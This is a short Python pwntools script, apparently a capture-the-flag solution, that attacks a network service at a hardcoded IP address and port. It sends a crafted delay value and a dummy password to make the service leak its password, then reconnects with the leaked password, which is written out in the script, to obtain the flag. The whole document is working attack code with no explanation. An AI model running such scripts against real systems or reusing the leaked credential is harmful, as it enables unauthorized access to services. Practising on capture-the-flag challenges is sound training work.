from pwn import remote
import time

host = '46.246.109.251'
port = 63140

# Leak password
delay = 2569
password = "anything"
conn = remote(host, port)
conn.send((str(delay) + '\r\n').encode())
conn.send((password + '\r\n').encode())
while True:
    res = conn.recvline()
    print(res)
    if b'Shutting down...' in res:
        break
conn.close()

print("Waiting 10 seconds before reconnecting...")
time.sleep(10)

# Get flag
delay = 100000 # Something that does not crash anything before the flag is printed
leaked_password = 'cRejzyG0odPas5wd'
conn = remote(host, port)
conn.send((str(delay) + '\r\n').encode())
conn.send((leaked_password + '\r\n').encode())
while True:
    res = conn.recvline()
    print(res)
    if b'Shutting down...' in res or b'flag' in res:
        break
conn.close()
